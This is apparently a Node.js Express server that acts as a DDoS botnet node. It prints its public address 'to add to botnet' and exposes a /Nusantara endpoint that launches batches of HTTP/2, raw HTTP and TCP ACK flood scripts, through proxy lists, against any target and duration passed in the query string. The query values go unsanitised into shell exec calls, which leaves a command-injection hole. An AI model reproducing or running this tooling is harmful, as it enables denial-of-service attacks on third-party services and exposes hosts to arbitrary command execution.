const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5552;
const scrapeProxies = require('./proxy.js');

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
  return data;
}

app.get('/Nusantara', (req, res) => {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

  // Eksekusi sesuai methods
  if (methods === 'H2-NUST') {
    console.log('received');
    exec(`node methods/H2F3.js ${target} ${time} 9 2 proxy.txt bypass`);
    exec(`node methods/vhold.js ${target} ${time} 12 4 proxy.txt`);
    exec(`node methods/killnet.js ${target} ${time} 5 1 proxy.txt`);
    exec(`node methods/blupas.js ${target} ${time} 13 2 proxy.txt`);
    exec(`node methods/bits.js ${target} ${time} 2 1 proxy.txt`);
    exec(`node methods/h2-brite.js ${target} ${time} 12 3 proxy.txt`);
    exec(`node methods/h2-nust ${target} ${time} 13 4 proxy.txt`);
    exec(`node methods/nust.js ${target} ${time} 7 2 proxy.txt`);
    exec(`node methods/floodv2.js ${target} ${time} 1 5 proxy.txt`);
    exec(`node methods/mix.js ${target} ${time} 16 5 proxy.txt`);
    exec(`node methods/raw.js ${target} ${time} 4 2 proxy.txt`);
    exec(`node methods/H2-FLASH.js ${target} ${time} 64 10 proxy.txt`);
    exec(`node methods/h2-poby.js ${target} ${time} 4 2 proxy.txt`);
    exec(`node methods/mb.js ${target} ${time} 6 2 proxy.txt`);
    exec(`node methods/so.js ${target} ${time} 2 2 proxy.txt`);
    exec(`node methods/ciko.js ${target} ${time} 3 1 proxy.txt`);
  } else if (methods === 'RAW-HTTP') {
    console.log('received');
    exec(`node methods/raw.js ${target} ${time}`);
    exec(`node methods/http-panel.js ${target} ${time}`);
    exec(`node methods/https.js GET ${target} ${time} 14 3 proxy.txt --cookie`);
    exec(`node methods/h2-nust.js ${target} ${time} 19 4 proxy.txt`);
    exec(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
    exec(`node methods/h2-txorzsange.js ${target} ${time} 18 2 proxy.txt`);
  } else if (methods === 'L7-DSTAT') {
    console.log('received');
    exec(`node methods/nuke.js ${target} ${time} 11 2 proxy.txt`);
    exec(`node methods/H2-FLASH.js ${target} ${time} 8 2 proxy.txt`);
    exec(`node methods/ciko.js ${target} ${time} 6 1 proxy.txt`);
    exec(`node methods/nust.js ${target} ${time} 12 3 proxy.txt`);
    exec(`node methods/so.js ${target} ${time} 18 4 proxy.txt`);
    exec(`node methods/h2-zamsy.js ${target} ${time} 10 5 proxy.txt`);
  } else if (methods === 'HOLD-PANEL') {
    console.log('received');
    exec(`node methods/http-panel.js ${target} ${time}`);
  } else if (methods === 'OVH-ACK') {
    console.log('received');
    exec(`node methods/tcp-ack.js ${target} ${port} ${time}`);
    exec(`node methods/tcp-kill.js ${target} ${time} ${time}`);
    exec(`node methods/./tcp-pps.js ${target} ${port} 1000 ${time}`);
  } else if (methods === 'STD') {
    console.log('received');
    exec(`node methods/tcp-ack.js ${target} ${port} ${time}`);
    exec(`node methods/tcp-kill.js ${target} ${time} ${time}`);
    exec(`node methods/./tcp-pps.js ${target} ${port} 1000 ${time}`);
  }
});

app.listen(port, () => {
  fetchData();
});
